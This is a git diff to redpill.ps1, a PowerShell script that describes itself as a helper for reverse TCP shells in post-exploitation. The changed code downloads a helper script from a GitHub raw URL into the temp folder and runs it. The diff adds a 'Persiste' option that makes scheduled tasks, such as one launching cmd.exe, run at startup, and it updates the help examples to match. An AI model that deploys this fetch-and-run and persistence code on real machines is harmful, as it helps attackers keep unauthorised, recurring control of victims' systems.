@@ -1,4 +1,4 @@
-﻿<#
+<#
 .SYNOPSIS
    CmdLet to assiste reverse tcp shells in post-exploitation
 
@@ -586,7 +586,7 @@ If($GetTasks -ieq "Enum" -or $GetTasks -ieq "Create" -or $GetTasks -ieq "Delete"
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetTasks.ps1 -Destination $Env:TMP\GetTasks.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetTasks.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 8){## Corrupted download detected => DefaultFileSize: 8,0869140625/KB
+      If($SizeDump -lt 11){## Corrupted download detected => DefaultFileSize: 11,232421875/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetTasks.ps1"){Remove-Item -Path "$Env:TMP\GetTasks.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -610,7 +610,7 @@ If($GetTasks -ieq "Enum" -or $GetTasks -ieq "Create" -or $GetTasks -ieq "Delete"
    {
        If($Exec -ieq "false"){$Exec = "cmd.exe"}
        If($TaskName -ieq "false"){$TaskName = "RedPillTask"}
-       powershell -File "$Env:TMP\GetTasks.ps1" -GetTasks Create -TaskName $TaskName -Interval $Interval -Exec $Exec
+       powershell -File "$Env:TMP\GetTasks.ps1" -GetTasks Create -TaskName $TaskName -Interval $Interval -Exec $Exec -Persiste $Persiste
    }
    ElseIf($GetTasks -ieq "Delete")
    {
@@ -621,6 +621,7 @@ If($GetTasks -ieq "Enum" -or $GetTasks -ieq "Create" -or $GetTasks -ieq "Delete"
    ## Clean Old files left behind
    If(Test-Path -Path "$Env:TMP\GetTasks.ps1"){Remove-Item -Path "$Env:TMP\GetTasks.ps1" -Force}
 }
+
 
 If($GetLogs -ieq "Enum" -or $GetLogs -ieq "DeleteAll" -or $GetLogs -ieq "Verbose" -or $getLogs -ieq "Yara"){
 If($NewEst -lt "1"){$NewEst = "3"} ## Set the min logs to display
@@ -1757,7 +1758,7 @@ If($NetTrace -ieq "Enum"){
    If(Test-Path -Path "$Env:TMP\NetTrace.ps1"){Remove-Item -Path "$Env:TMP\NetTrace.ps1" -Force}
 }
 
-If($Persiste -ne "false" -or $Persiste -ieq "Stop"){
+If($Persiste -ne "false" -and $GetTasks -ieq "false"){
 
    <#
    .SYNOPSIS
@@ -3562,8 +3563,8 @@ $HelpParameters = @"
 
    .NOTES
       Created tasks have the default duration of 12 hours.
-      If executed with 'ADMINISTRATOR' privileges then this
-      cmdlet will set the created task(s) to run as 'SYSTEM'!
+      Remark: Dont leave empty spaces in -TaskName '<string>'
+      declaration when creating a new task with this cmdlet.
 
    .Parameter GetTasks
       Accepts arguments: Enum, Create, Delete (default: Enum)
@@ -3575,7 +3576,10 @@ $HelpParameters = @"
       The interval time (in minuts) to run the task (default: 1)
 
    .Parameter Exec
-      The cmdline (cmd|ps) to be executed by the task (default: false)
+      The cmdline\appl to be executed by the task (default: false)
+
+   .Parameter Persiste
+      Execute the created schedule task at startup? (default: false)
 
    .EXAMPLE
       PS C:\> .\redpill.ps1 -GetTasks Enum
@@ -3586,8 +3590,12 @@ $HelpParameters = @"
       Enumerate only 'CDSSync' task detailed information!
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -GetTasks Create -TaskName mytask -Interval 10 -Exec "cmd /c start calc.exe"
-      Creates 'mytask' taskname that executes 'calc.exe' with 10 minutes of interval and 12 hours of duration
+      PS C:\> .\redpill.ps1 -GetTasks Create -TaskName "mytask" -Interval 10 -Exec "cmd /c start calc.exe"
+      Creates the taskname 'mytask' that executes 'calc.exe' with 10 minuts of interval (loop) for 12 hours!
+
+   .EXAMPLE
+      PS C:\> .\redpill.ps1 -GetTasks Create -TaskName "myTask" -Exec "cmd.exe" -Interval 2 -Persiste True
+      Creates the taskname 'myTask' that executes 'cmd.exe' at STARTUP with 2 minuts of interval! (loop)
 
    .EXAMPLE
       PS C:\> .\redpill.ps1 -GetTasks Delete -TaskName "mytask"
